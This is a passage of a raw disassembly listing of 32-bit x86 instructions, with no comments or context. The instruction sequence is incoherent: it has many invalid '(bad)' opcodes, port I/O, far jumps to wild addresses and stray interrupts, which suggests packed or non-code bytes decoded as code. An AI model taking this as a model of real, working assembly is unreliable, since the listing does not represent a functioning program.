  40486e:	sub    ecx,esp
  404870:	mov    edi,0x983b9770
  404875:	out    dx,eax
  404876:	add    DWORD PTR [esp+edx*8-0x25],edi
  40487a:	push   ecx
  40487b:	les    esi,FWORD PTR [edx+0x66105825]
  404881:	fcomip st,st(2)
  404884:	inc    ecx
  404885:	xor    esi,esi
  404887:	sub    DWORD PTR [edx+0x11],esi
  40488a:	fiadd  DWORD PTR [edx]
  40488c:	push   ss
  40488d:	pop    esp
  40488e:	ds jmp 0xf7f5b134
  404894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404895:	add    al,0x48
  404897:	mov    al,ds:0xd186a5c7
  40489c:	leave  
  40489d:	call   0xb059b929
  4048a2:	adc    DWORD PTR cs:[edx],esi
  4048a5:	add    eax,0x32bc5fe1
  4048aa:	lds    ecx,FWORD PTR [esi+esi*4-0x7c6179af]
  4048b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048b2:	xchg   ax,ax
  4048b4:	jle    0x4048e5
  4048b6:	push   ecx
  4048b7:	in     al,dx
  4048b8:	int    0x4e
  4048ba:	pop    esp
  4048bb:	stos   BYTE PTR es:[edi],al
  4048bc:	inc    esi
  4048bd:	mov    ecx,edi
  4048bf:	mov    ebp,0x807ee069
  4048c4:	mov    esi,0x326e8d9a
  4048c9:	xchg   edx,eax
  4048ca:	xor    al,0x71
  4048cc:	fidivr WORD PTR [edi+0x634f479]
  4048d2:	cmp    bl,dh
  4048d4:	mov    cl,0x76
  4048d6:	jmp    0x4048f2
  4048d8:	jae    0x404933
  4048da:	adc    bl,cl
  4048dc:	xchg   ah,cl
  4048de:	pop    esi
  4048df:	mov    ah,0x79
  4048e1:	(bad)  [ebx+ebp*1+0xecdf050]
  4048e8:	mov    esp,0xac9aec87
  4048ed:	mov    eax,ds:0x2146b54c
  4048f2:	or     ebp,DWORD PTR [ebp-0x6c]
  4048f5:	cmp    eax,0xa60dd2de
  4048fa:	stos   DWORD PTR es:[edi],eax
  4048fb:	mov    dl,0xcc
  4048fd:	sub    bh,BYTE PTR [esi-0x78]
  404900:	das    
  404901:	inc    edx
  404902:	mov    dl,0xf7
  404904:	inc    esi
  404905:	dec    edx
  404906:	dec    eax
  404907:	push   ebx
  404908:	inc    DWORD PTR [edx+0x4c]
  40490b:	popa   
  40490c:	out    dx,al
  40490d:	mov    BYTE PTR [ecx],al
  40490f:	outs   dx,DWORD PTR ds:[esi]
  404910:	push   edx
  404911:	cmp    al,0xb
  404913:	call   0x8c9:0x8879bd0f
  40491a:	xchg   ecx,eax
  40491b:	mov    esp,0x5755fe73
  404920:	dec    esi
  404921:	je     0x404963
  404923:	loopne 0x404947
  404925:	or     esi,DWORD PTR ds:0xdb76660e
  40492b:	xor    edi,DWORD PTR [eax+0x67d9a09c]
  404931:	xor    eax,0x971261f
  404936:	or     BYTE PTR [eax-0x69e567aa],bh
  40493c:	ror    ch,1
  40493e:	jge    0x404950
  404940:	xchg   edx,eax
  404941:	hlt    
  404942:	and    eax,0x64534072
  404947:	jmp    0x40493b
  404949:	das    
  40494a:	and    bh,BYTE PTR [esi+0x70d94a54]
  404950:	popf   
  404951:	outs   dx,DWORD PTR ds:[esi]
  404952:	adc    DWORD PTR [ebp+0x27],0xffffffd5
  404956:	pop    eax
  404957:	aad    0x21
  404959:	xor    bl,BYTE PTR [edi]
  40495b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40495c:	xor    BYTE PTR [ecx+edx*4+0x1723e411],ch
  404963:	mov    WORD PTR [esi],fs
  404965:	(bad)  
  404966:	in     al,dx
  404967:	cmp    al,0xa3
  404969:	(bad)  
  40496a:	sar    BYTE PTR [edx-0x603c744],1
  404970:	aam    0x4
  404972:	add    ecx,edx
  404974:	retf   0x4823
  404977:	cmp    cl,BYTE PTR [edi-0x35]
  40497a:	xor    esi,esi
  40497c:	xor    eax,0x6fd4976a
  404981:	dec    esi
  404982:	add    eax,DWORD PTR [edi]
  404984:	mov    esp,0xb42e8e52
  404989:	mov    al,ds:0x1ffbebd4
  40498e:	inc    ecx
  40498f:	outs   dx,BYTE PTR ds:[esi]
  404991:	cld    
  404992:	loop   0x4049c0
  404994:	mov    ebx,0x7f2006ad
  404999:	out    0x4f,al
  40499b:	out    0x1f,al
  40499d:	pop    edx
  40499e:	fadd   QWORD PTR [eax]
  4049a0:	int    0x8a
  4049a2:	dec    edx
  4049a3:	leave  
  4049a4:	stos   DWORD PTR es:[edi],eax
  4049a5:	xchg   ebp,eax
  4049a6:	push   esp
  4049a7:	cmp    ecx,esi
  4049a9:	cdq    
  4049aa:	jecxz  0x4049b8
  4049ac:	pusha  
  4049ad:	push   0x5d
  4049af:	sbb    BYTE PTR [ecx-0x6f902b9c],bh
  4049b5:	push   edx
  4049b6:	mov    cl,ch
  4049b8:	icebp  
  4049b9:	pop    ebp
  4049ba:	jl     0x404999
  4049bc:	arpl   ax,bp
  4049be:	int3   
  4049bf:	jl     0x404a11
  4049c1:	dec    esi
  4049c2:	cmp    BYTE PTR [ecx],dh
  4049c4:	inc    edi
  4049c5:	xchg   esp,eax
  4049c6:	cmp    edi,edx
  4049c8:	and    eax,esp
  4049ca:	gs aam 0xaf
  4049cd:	cwde   
  4049ce:	data16 scas al,BYTE PTR es:[edi]
  4049d0:	stos   DWORD PTR es:[edi],eax
  4049d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d2:	xchg   ecx,eax
  4049d3:	adc    cl,BYTE PTR [ebp-0x2]
  4049d6:	add    edi,ebp
  4049d8:	jb     0x4049c6
  4049da:	cld    
  4049db:	sub    DWORD PTR [eax+0x3b8d7f9a],edx
  4049e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049e2:	aas    
  4049e3:	jno    0x404a49
  4049e5:	pop    ebx
  4049e6:	div    DWORD PTR [ebp-0x12]
  4049e9:	imul   ecx,DWORD PTR [ebx],0x291b09bf
  4049ef:	sahf   
  4049f0:	xor    eax,0x731b7f58
  4049f5:	imul   ebp,ecx,0x996478f7
  4049fb:	adc    eax,0x2190a2ef
  404a00:	fsub   st(5),st
  404a02:	je     0x404a6e
  404a04:	(bad)  
  404a05:	dec    edi
  404a06:	gs hlt 
  404a08:	pop    es
  404a09:	dec    ebp
  404a0a:	dec    eax
  404a0b:	scas   al,BYTE PTR es:[edi]
  404a0c:	cs dec esp
  404a0e:	inc    edi
  404a0f:	push   ss
  404a10:	add    eax,0x578755e
  404a15:	xor    DWORD PTR [ecx+0x79],ebx
  404a18:	int    0xd4
  404a1a:	ror    DWORD PTR [edi-0x20345d53],cl
  404a20:	sbb    al,BYTE PTR [esi+0x62]
  404a23:	ret    0x93e4
  404a26:	cmp    cl,BYTE PTR [edi+0x6b768615]
  404a2c:	push   0x6c
  404a2e:	xchg   ebp,eax
  404a2f:	addr16 inc ecx
  404a31:	iret   
  404a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a33:	xor    DWORD PTR [eax+0x2e],0xbcf5b1f2
  404a3a:	jno    0x404a98
  404a3c:	leave  
  404a3d:	jmp    0xcde5e450
  404a42:	out    dx,al
  404a43:	mov    esi,edx
  404a45:	leave  
  404a46:	ds pop esp
  404a48:	jb     0x404a25
  404a4a:	or     BYTE PTR [eax+0x7c],0x3f
  404a4e:	add    BYTE PTR [edx+0x2c],dl
  404a51:	ja     0x4049d4
  404a53:	inc    ecx
  404a54:	inc    eax
  404a55:	mov    DWORD PTR [ecx+0x61a5725d],ecx
  404a5b:	imul   esp,DWORD PTR [eax-0x6acc75fa],0xffffffab
  404a62:	inc    esi
  404a63:	jp     0x404a63
  404a65:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404a67:	addr16 and eax,0xd9a79006
  404a6d:	enter  0x8c52,0x3c
  404a71:	ins    DWORD PTR es:[edi],dx
  404a72:	or     BYTE PTR [eax+ecx*4+0x9],bl
  404a76:	sar    DWORD PTR [ebp+0x3a7f629a],cl
  404a7c:	call   0xe8fddd1f
  404a81:	aaa    
  404a82:	das    
  404a83:	shl    esp,0x57
  404a86:	add    ah,al
  404a88:	inc    esp
  404a89:	mov    esi,0x98d378a0
  404a8e:	popa   
  404a8f:	stc    
  404a90:	xchg   DWORD PTR [ebx+ebx*4],ecx
  404a93:	mov    BYTE PTR [ebx],cl
  404a95:	es mov ch,0x2f
  404a98:	lods   al,BYTE PTR ds:[esi]
  404a99:	push   eax
  404a9a:	sub    al,0x71
  404a9c:	nop
  404a9d:	xchg   ecx,eax
  404a9e:	or     dh,BYTE PTR [eax+0x35]
  404aa1:	xchg   ebp,eax
  404aa2:	add    DWORD PTR [edx+0x3c184b0b],ebp
  404aa8:	popa   
  404aa9:	adc    bl,BYTE PTR [edi]
  404aab:	and    ecx,esp
  404aad:	pushf  
  404aae:	(bad)  
  404aaf:	cmp    al,BYTE PTR ds:0x2c491826
  404ab5:	add    al,BYTE PTR [edx+0x5b88c8f1]
  404abb:	xchg   BYTE PTR [ebp-0x35857ccc],bl
  404ac1:	dec    BYTE PTR [esi-0x391eb921]
  404ac7:	mov    ah,0x71
  404ac9:	popa   
  404aca:	mov    edi,0x37e405d5
  404acf:	add    al,0x8f
  404ad1:	out    0x7b,eax
  404ad3:	mov    ebp,0x44c90196
  404ad8:	dec    ecx
  404ad9:	test   edx,edi
  404adb:	dec    ebx
  404adc:	int3   
  404add:	sbb    BYTE PTR [eax+0x47],0x7d
  404ae1:	pop    eax
  404ae2:	mov    ds:0xb9fada2f,eax
  404ae7:	xor    BYTE PTR [edx],dh
  404ae9:	jmp    0x404b39
  404aeb:	jle    0x404b5d
  404aed:	push   cs
  404aee:	jmp    0x9344f64b
  404af3:	inc    ecx
  404af4:	call   0xb330:0x1afdbc59
  404afb:	iret   
  404afc:	mov    al,ds:0xd0dd1327
  404b01:	idiv   ecx
  404b03:	aad    0xb6
  404b05:	aaa    
  404b06:	aam    0x7e
  404b08:	adc    DWORD PTR [edx-0x6a],0xda1c861
  404b0f:	adc    dh,BYTE PTR [edi]
  404b11:	xchg   edx,eax
  404b12:	add    ecx,esi
  404b14:	test   DWORD PTR [ebx-0x2fa1d46a],esp
  404b1a:	push   ss
  404b1b:	sbb    al,0x63
  404b1d:	pop    esp
  404b1e:	sub    esp,DWORD PTR [esi+edi*1+0x793ad5a5]
  404b25:	dec    esp
  404b26:	fdivr  DWORD PTR [ebx]
  404b28:	in     al,dx
  404b29:	inc    eax
  404b2a:	sub    DWORD PTR [eax-0x7a9ff98d],0xffffffff
  404b31:	push   es
  404b32:	fidivr DWORD PTR ds:0x57058fb8
  404b38:	cwde   
  404b39:	mov    edi,0xf7171040
  404b3e:	mov    eax,0x21f659a0
  404b43:	push   cs
  404b44:	pop    esi
  404b45:	das    
  404b46:	loop   0x404b4e
  404b48:	add    al,ch
  404b4a:	xchg   DWORD PTR [edi-0x4b0bd305],esp
  404b50:	xor    eax,ebx
  404b52:	ja     0x404ae3
  404b54:	mov    ds:0x51897168,al
  404b59:	sub    edx,DWORD PTR [esi+ecx*4]
  404b5c:	add    esp,DWORD PTR [edx+0x7a7b9704]
  404b62:	inc    ebp
  404b63:	sbb    BYTE PTR [eax+0x213f233b],bl
  404b69:	scas   eax,DWORD PTR es:[edi]
  404b6a:	imul   esp,DWORD PTR [eax],0x84c71a59
  404b70:	sahf   
  404b71:	add    cl,al
  404b73:	sub    DWORD PTR [edi+0x3de8bbd4],0x53ddb04d
  404b7d:	sub    bl,al
  404b7f:	xor    ebx,DWORD PTR [ebx+0x4697703d]
  404b85:	(bad)  [edi]
  404b87:	jnp    0x404b7d
  404b89:	mov    bl,0xa9
  404b8b:	or     eax,0xaae29609
  404b90:	aam    0x2b
  404b92:	add    BYTE PTR [ebp-0x2b969fdc],al
  404b98:	dec    ebp
  404b99:	pop    esi
  404b9a:	rcl    BYTE PTR [edx-0x54178565],cl
  404ba0:	pop    edx
  404ba1:	jae    0x404bae
  404ba3:	leave  
  404ba4:	cmp    al,0x28
  404ba6:	sbb    eax,0x4a1fbd62
  404bab:	das    
  404bac:	pop    ebp
  404bad:	dec    ecx
  404bae:	sbb    cl,dl
  404bb0:	(bad)  
  404bb2:	inc    esi
  404bb3:	cmp    al,0x78
  404bb5:	test   BYTE PTR [edx+0x6e],dh
  404bb8:	pop    ds
  404bb9:	mov    bl,BYTE PTR [edi]
  404bbb:	mov    al,0xb3
  404bbd:	not    BYTE PTR [edi]
  404bbf:	loope  0x404be6
  404bc1:	out    dx,eax
  404bc2:	stc    
  404bc3:	mov    eax,0xdbee456b
  404bc8:	jp     0x404bc4
  404bca:	ins    BYTE PTR es:[edi],dx
  404bcb:	sbb    edi,edx
  404bcd:	inc    eax
  404bce:	test   DWORD PTR [ebp+0x39a6a233],edx
  404bd4:	and    dh,al
  404bd6:	test   al,0xd1
  404bd8:	in     eax,0xed
  404bda:	bound  esi,QWORD PTR [eax]
  404bdc:	sbb    eax,esi
  404bde:	jno    0x404c29
  404be0:	je     0x404b6a
  404be2:	xor    BYTE PTR [ecx+0x19],dl
  404be5:	push   edi
  404be6:	inc    eax
  404be7:	cmp    dl,cl
  404be9:	lds    edi,FWORD PTR [eax+edi*1+0x65979c98]
  404bf0:	mov    esp,0x98fa96c
  404bf5:	inc    esp
  404bf6:	push   0xffffffe1
  404bf8:	xchg   edx,eax
  404bf9:	(bad)  
  404bfa:	mov    edi,0x497ea2ff
  404bff:	and    ecx,DWORD PTR [esi-0x7b]
  404c02:	and    BYTE PTR [ebp+0x2049a2ce],0x7e
  404c09:	xchg   edx,eax
  404c0a:	jbe    0x404bb1
  404c0c:	ror    BYTE PTR [ecx+0x241457f0],cl
  404c12:	mov    ebx,0xf23e9f
  404c17:	aaa    
  404c18:	cmp    BYTE PTR [ecx],bh
  404c1a:	pop    ds
  404c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c1c:	push   eax
  404c1d:	js     0x404c56
  404c1f:	jmp    0x164537d6
  404c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c25:	xor    DWORD PTR [eax+ecx*2-0x2094621e],edi
  404c2c:	(bad)  
  404c2d:	(bad)  
  404c2e:	adc    eax,0xe200e20d
  404c33:	pop    eax
  404c34:	sub    bh,BYTE PTR [esi-0x2e]
  404c37:	xor    BYTE PTR [ebp+0x1],ah
  404c3a:	mov    dh,0x6
  404c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c3d:	mov    WORD PTR [ebx-0x49],cs
  404c40:	or     bl,dh
  404c42:	mov    al,BYTE PTR [eax-0x7d4c67d7]
  404c48:	pop    edi
  404c49:	sub    BYTE PTR [ebx],ch
  404c4b:	sti    
  404c4c:	or     dh,dh
  404c4e:	and    DWORD PTR ds:0x109a3a2d,ecx
  404c54:	jns    0x404cbd
  404c56:	(bad)  
  404c57:	rcl    BYTE PTR [ebx-0x4d],0x58
  404c5b:	mov    dl,0xca
  404c5d:	mov    ch,0x9a
  404c5f:	rol    eax,1
  404c61:	or     dh,0x3
  404c64:	sahf   
  404c65:	into   
  404c66:	cmp    ebx,DWORD PTR [ebx+0x51]
  404c69:	xchg   esp,eax
  404c6a:	cmp    DWORD PTR [edi-0x22],esi
  404c6d:	(bad)  
  404c6f:	cli    
  404c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c71:	popa   
  404c72:	addr16 inc ecx
  404c74:	int3   
  404c75:	popa   
  404c76:	mov    bh,BYTE PTR [edx]
  404c78:	aam    0x41
  404c7a:	ror    BYTE PTR [eax],1
  404c7c:	sub    BYTE PTR [ebx],0x6c
  404c7f:	mov    ds:0x16317742,eax
  404c84:	jmp    0x33cd:0x8b8cce13
  404c8b:	mov    WORD PTR [ecx+0x33],ss
  404c8e:	adc    DWORD PTR [esi],eax
  404c90:	loope  0x404c37
  404c92:	push   edi
  404c93:	mov    eax,ds:0xaa9513b7
  404c98:	xor    BYTE PTR [edi],ch
  404c9a:	arpl   WORD PTR [edi+0x58433375],bx
  404ca0:	ja     0x404c30
  404ca2:	fcom   QWORD PTR [esi+0x67dae666]
  404ca8:	repnz add al,0x1
  404cab:	test   BYTE PTR [eax-0x2d8c9adf],bl
  404cb1:	mov    ds:0x3daa8c5d,eax
  404cb6:	push   es
  404cb7:	xchg   ecx,eax
  404cb8:	shl    DWORD PTR [ecx+0x52f014f9],0x74
  404cbf:	nop
  404cc0:	dec    edx
  404cc1:	xor    eax,0xaf62651e
  404cc6:	sbb    esp,DWORD PTR [eax-0x15]
  404cc9:	fldcw  WORD PTR [edi]
  404ccb:	xchg   edi,eax
  404ccc:	cmp    ebp,esp
  404cce:	mov    ch,0x38
  404cd0:	les    edi,FWORD PTR [eax+0x67694b18]
  404cd6:	sbb    ebx,DWORD PTR [eax+0x3d]
  404cd9:	and    ah,BYTE PTR [ebx]
  404cdb:	test   DWORD PTR [edx],edi
  404cdd:	ins    BYTE PTR es:[edi],dx
  404cde:	test   eax,0x738e49dd
  404ce3:	pop    ds
  404ce4:	sbb    ebx,ecx
  404ce6:	push   edx
  404ce7:	adc    eax,0x30cc4f42
  404cec:	aam    0x68
  404cee:	cwde   
  404cef:	in     eax,0xc5
  404cf1:	cmp    esi,DWORD PTR [bp+di]
  404cf4:	shr    BYTE PTR [edi+0x556b91d5],1
  404cfa:	push   eax
  404cfb:	cmp    dh,BYTE PTR [ecx-0x3548d206]
  404d01:	gs or  al,0xc1
  404d05:	inc    eax
  404d06:	loopne 0x404d25
  404d08:	std    
  404d09:	ja     0x404d61
  404d0b:	(bad)  
  404d0c:	arpl   bp,si
  404d0e:	dec    ecx
  404d0f:	popf   
  404d10:	push   0xbd7ed4a2
  404d15:	pop    edi
  404d16:	mov    DWORD PTR [esi],ebx
  404d18:	push   ebx
  404d19:	ss mov edi,0xfec9b24d
  404d1f:	push   esp
  404d20:	sbb    BYTE PTR [ebp+0x6d],cl
  404d23:	aas    
  404d24:	lahf   
  404d25:	push   ebx
  404d26:	fadd   QWORD PTR [ebp-0x1e]
  404d29:	or     BYTE PTR ss:[bp+si-0x2d],0xf4
  404d2f:	mov    bl,0x3a
  404d31:	inc    eax
  404d32:	sub    al,0x61
  404d34:	into   
  404d35:	sub    eax,0xff1e79d
  404d3a:	xlat   BYTE PTR ds:[ebx]
  404d3b:	sub    ebp,esi
  404d3d:	mov    dl,0xa2
  404d3f:	ror    BYTE PTR [ebx-0x7b],1
  404d42:	push   0x3c44b7a8
  404d47:	or     edx,esp
  404d49:	inc    esp
  404d4a:	add    BYTE PTR [eax+ecx*1+0x6c],al
  404d4e:	inc    edx
  404d4f:	lods   al,BYTE PTR ds:[esi]
  404d50:	daa    
  404d51:	xchg   esp,eax
  404d52:	dec    edi
  404d53:	inc    esp
  404d54:	ret    
  404d55:	xor    ebp,DWORD PTR [eax+ebx*8-0x7a628156]
  404d5c:	mov    eax,ds:0xee211a0c
  404d61:	or     BYTE PTR [eax+0x2d],al
  404d64:	pop    ss
  404d65:	sti    
  404d66:	sbb    esp,ebp
  404d68:	outs   dx,DWORD PTR ds:[esi]
  404d69:	jge    0x404cfc
  404d6b:	xchg   edx,eax
  404d6c:	fcomp  QWORD PTR [edx-0xd]
  404d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d70:	xchg   edi,eax
  404d71:	jg     0x404d29
  404d73:	in     eax,0x84
  404d75:	sub    eax,0x3077dde6
  404d7a:	adc    al,0xc5
  404d7c:	(bad)  
  404d7d:	sar    BYTE PTR [edx+0x5f8a6d74],1
  404d83:	enter  0xb66b,0x31
  404d87:	adc    cl,bh
  404d89:	sub    bl,dh
  404d8b:	push   0xffffffb5
  404d8d:	add    dh,bl
  404d8f:	xchg   edx,eax
  404d90:	out    0xd5,al
  404d92:	mov    cs,WORD PTR [esi+0x20]
  404d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d96:	mov    ch,0xf0
  404d98:	adc    eax,DWORD PTR [esi+esi*8]
  404d9b:	mov    al,0xb6
  404d9d:	push   edi
  404d9e:	mov    esp,0x8c223337
  404da3:	xor    dh,BYTE PTR [ebp-0x3]
  404da6:	jno    0x404df9
  404da8:	fisub  WORD PTR [ebx+0x6d]
  404dab:	aaa    
  404dac:	cli    
  404dad:	and    al,0x3c
  404daf:	idiv   edi
  404db1:	dec    esi
  404db2:	cli    
  404db3:	add    bh,al
  404db5:	loope  0x404d3a
  404db7:	pop    DWORD PTR [edx+0x79]
  404dba:	pop    edi
  404dbb:	jle    0x404d64
  404dbd:	ds push ebp
  404dbf:	xor    DWORD PTR [ebp-0x6f],eax
  404dc2:	mov    bh,0xc
  404dc4:	daa    
  404dc5:	push   0x41
  404dc7:	add    BYTE PTR [edx-0x520a915],0x6c
  404dce:	mov    ch,0x21
  404dd0:	adc    BYTE PTR [ecx+0x46500cab],dh
  404dd6:	fcmovbe st,st(3)
  404dd8:	test   BYTE PTR [edx+0x4e],0x8c
  404ddc:	outs   dx,DWORD PTR ds:[esi]
  404ddd:	pop    ebx
  404dde:	out    0xbe,eax
  404de0:	cmp    BYTE PTR [ecx],bh
  404de2:	into   
  404de3:	sti    
  404de4:	rcl    DWORD PTR [edi],0xad
  404de7:	out    0x5b,al
  404de9:	retf   
  404dea:	jecxz  0x404dd0
  404dec:	out    dx,eax
  404ded:	aad    0x27
  404def:	in     eax,0x1b
  404df1:	xchg   ecx,eax
  404df2:	adc    al,0xc0
  404df4:	in     al,0x81
  404df6:	clc    
  404df7:	sub    DWORD PTR [eax+0x4b],edx
  404dfa:	sub    ebp,esp
  404dfc:	dec    edx
  404dfd:	sub    DWORD PTR [edx-0x4c],0x2972b5ee
  404e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e05:	push   edi
  404e06:	call   0xbbea1826
  404e0b:	ud2    
  404e0d:	cmp    eax,0x59aada18
  404e12:	mov    ecx,DWORD PTR [eax-0x2a01bfec]
  404e18:	sbb    ah,BYTE PTR [edx+0x11]
  404e1b:	fst    QWORD PTR [ecx-0xd1fc56]
  404e21:	mov    edx,0xe4ebefa8
  404e26:	mov    ds:0xb4bcf301,al
  404e2b:	jp     0x404e3f
  404e2d:	mov    ebx,0x47ef80c0
  404e32:	fst    DWORD PTR [esi]
  404e34:	jg     0x404e24
  404e36:	jge    0x404dbb
  404e38:	xchg   edi,eax
  404e39:	and    ebp,eax
  404e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e3c:	mov    bh,0x8f
  404e3e:	test   DWORD PTR [ebx],eax
  404e40:	xchg   edx,eax
  404e41:	cld    
  404e42:	mov    esi,0x6ce69c43
  404e47:	dec    eax
  404e48:	xchg   esi,eax
  404e49:	xor    al,0x5f
  404e4b:	ja     0x404e82
  404e4d:	sub    al,0x78
  404e4f:	repz fdivr st(4),st
  404e52:	cmp    BYTE PTR gs:[edi-0x356cb6ab],0x61
  404e5a:	fst    st(1)
  404e5c:	inc    ebx
  404e5d:	gs xchg ecx,eax
  404e5f:	pop    esi
  404e60:	sub    eax,0xe84fb61e
  404e65:	xchg   ebx,eax
  404e66:	lahf   
  404e67:	xor    bl,BYTE PTR [edx-0x35cd6dc4]
  404e6d:	fnstcw WORD PTR [esp+edx*1+0x5277d68e]
  404e74:	int3   
  404e75:	popa   
  404e76:	xchg   edi,eax
  404e77:	sub    bl,0x27
  404e7a:	aam    0xeb
  404e7c:	add    edi,ebx
  404e7e:	cwde   
  404e7f:	pop    esi
  404e80:	in     al,dx
  404e81:	mov    BYTE PTR [esi],cl
  404e83:	mov    edx,0x540336a8
  404e88:	loop   0x404efe
  404e8a:	or     al,0x30
  404e8c:	es push 0x460062f4
  404e92:	inc    ebx
  404e93:	and    ebp,DWORD PTR [esi+0x3d]
  404e96:	lods   eax,DWORD PTR ds:[esi]
  404e97:	dec    esp
  404e98:	(bad)  
  404e99:	aam    0xe6
  404e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e9c:	xor    eax,0x59dff736
  404ea1:	cmp    dh,BYTE PTR [edi+ecx*1-0x7ab10776]
  404ea8:	ja     0x404ebe
  404eaa:	jle    0x404e31
  404eac:	rcl    ah,1
  404eae:	xchg   ecx,eax
  404eaf:	mov    eax,ds:0x922c12a4
  404eb4:	push   ds
  404eb5:	sbb    BYTE PTR [edi],cl
  404eb7:	stos   BYTE PTR es:[edi],al
  404eb8:	xchg   BYTE PTR [edi],al
  404eba:	and    bl,0xfc
  404ebd:	retf   0x490e
  404ec0:	mov    eax,ds:0x79a10935
  404ec5:	push   ecx
  404ec6:	js     0x404ee5
  404ec8:	push   esi
  404ec9:	mov    al,ds:0x3d77cc5e
  404ece:	pop    edi
  404ecf:	out    dx,al
  404ed0:	adc    al,0x4d
  404ed2:	inc    ecx
  404ed3:	mov    edi,0x19c42df8
  404ed8:	lods   eax,DWORD PTR ds:[esi]
  404ed9:	sbb    bl,BYTE PTR [edx]
  404edb:	fmul   st(5),st
  404edd:	aaa    
  404ede:	jnp    0x404e9d
  404ee0:	mov    dl,0x21
  404ee2:	cmc    
  404ee3:	mov    bh,BYTE PTR [edx]
  404ee5:	(bad)  [esi]
  404ee7:	addr16 adc cl,al
  404eea:	aaa    
  404eeb:	mov    edx,0xf4a99ad9
  404ef0:	jns    0x404f1f
  404ef2:	mov    ah,0xd0
  404ef4:	push   ebx
  404ef5:	adc    al,0x28
  404ef7:	dec    ebp
  404ef8:	into   
  404ef9:	mov    edx,0xb68d1fab
  404efe:	xor    DWORD PTR fs:[ebp*2-0x23c0bfc4],esp
  404f06:	mov    al,0x22
  404f08:	fcmovnbe st,st(1)
  404f0a:	inc    esp
  404f0b:	ret    
  404f0c:	cmp    esp,DWORD PTR [edi]
  404f0e:	mov    ch,0x56
  404f10:	arpl   ax,bp
  404f12:	mov    ebx,0xb242d6bb
  404f17:	xor    DWORD PTR [ebp+0x710401ba],0x2c
  404f1e:	adc    DWORD PTR [ecx-0x309a374e],eax
  404f24:	adc    DWORD PTR [eax+0x23107104],0x2bbd6f57
  404f2e:	push   esp
  404f2f:	mov    dh,ah
  404f31:	lahf   
  404f32:	push   ebx
  404f34:	retf   
  404f35:	jo     0x404f89
  404f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f38:	idiv   DWORD PTR [eax]
  404f3a:	cmp    DWORD PTR [eax-0x1f254ba4],esi
  404f40:	xor    eax,0xa3dd8057
  404f45:	cdq    
  404f46:	mov    al,0x7f
  404f48:	cdq    
  404f49:	pop    ebx
  404f4a:	jge    0x404ed4
  404f4c:	arpl   WORD PTR [ebp+edi*4-0x24],bp
  404f50:	fstp   QWORD PTR [eax+0x1d78320b]
  404f56:	mov    al,ds:0x1fd8bd4d
  404f5b:	(bad)  
  404f5c:	fidiv  DWORD PTR [ebp+0x35]
  404f5f:	dec    ebx
  404f60:	fmul   QWORD PTR [ecx]
  404f62:	jae    0x404eff
  404f64:	data16 mov dl,0xaa
  404f67:	push   ss
  404f68:	es mov dh,bh
  404f6b:	mov    dl,0x7a
  404f6d:	push   ebp
  404f6e:	pop    ebx
  404f6f:	fmul   DWORD PTR [ebx+0x5db7b534]
  404f75:	test   DWORD PTR [edi+ebp*2-0x55],ecx
  404f79:	mov    bl,0x19
  404f7b:	pop    edi
  404f7c:	test   DWORD PTR [ecx],edx
  404f7e:	int3   
  404f7f:	out    0x40,eax
  404f81:	mov    al,BYTE PTR [edi]
  404f83:	sar    dh,1
  404f85:	pushf  
  404f86:	inc    esp
  404f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f88:	inc    edi
  404f89:	les    eax,FWORD PTR [edx]
  404f8b:	xchg   ebx,eax
  404f8c:	add    bh,al
  404f8e:	das    
  404f8f:	hlt    
  404f90:	push   ss
  404f91:	enter  0x3d7e,0xb0
  404f95:	dec    esi
  404f96:	adc    eax,0x70fd13da
  404f9b:	push   0xe8c373b2
  404fa0:	es jns 0x404f92
  404fa3:	jecxz  0x40501d
  404fa5:	shl    BYTE PTR [ecx+ebp*8],0x1b
  404fa9:	test   BYTE PTR [ecx-0x12358720],dh
  404faf:	fadd   st,st(5)
  404fb1:	(bad)  
  404fb2:	cmp    ch,cl
  404fb4:	and    ah,BYTE PTR [ecx-0x65]
  404fb7:	pop    eax
  404fb8:	retf   0x575c
  404fbb:	push   edx
  404fbc:	add    BYTE PTR [edi],cl
  404fbe:	sar    DWORD PTR [ecx+0x76],1
  404fc1:	xlat   BYTE PTR ds:[ebx]
  404fc2:	xor    DWORD PTR [edx-0x594ff7dd],ecx
  404fc8:	aad    0x57
  404fca:	int3   
  404fcb:	and    eax,0x9349ed56
  404fd0:	(bad)  
  404fd1:	enter  0xa13e,0xbf
  404fd5:	aad    0xd7
  404fd7:	inc    ebx
  404fd8:	test   DWORD PTR [ecx],0x35435b08
  404fde:	data16 (bad) [ebp+esi*8+0x14]
  404fe3:	xchg   bl,cl
  404fe5:	lahf   
  404fe6:	push   0xfdc898a2
  404feb:	mov    esi,0xff4dd59b
  404ff0:	inc    ebp
  404ff1:	cmp    eax,DWORD PTR [ebp+eax*4-0x4a]
  404ff5:	jge    0x405007
  404ff7:	pushf  
  404ff8:	lods   eax,DWORD PTR ds:[esi]
  404ff9:	jge    0x405063
  404ffb:	sub    DWORD PTR [edi+ebx*1],0x147fa407
  405002:	ficomp DWORD PTR [eax+edi*4-0x2e8d605d]
  405009:	dec    esi
  40500a:	sbb    ch,ah
  40500c:	push   DWORD PTR [eax+0x14]
  40500f:	sar    ecx,1
  405011:	fimul  DWORD PTR [edi+0x236a4abd]
  405017:	sbb    BYTE PTR [ebx+0x3a4024a4],0xf
  40501e:	pop    esi
  40501f:	mov    dl,0x40
  405021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
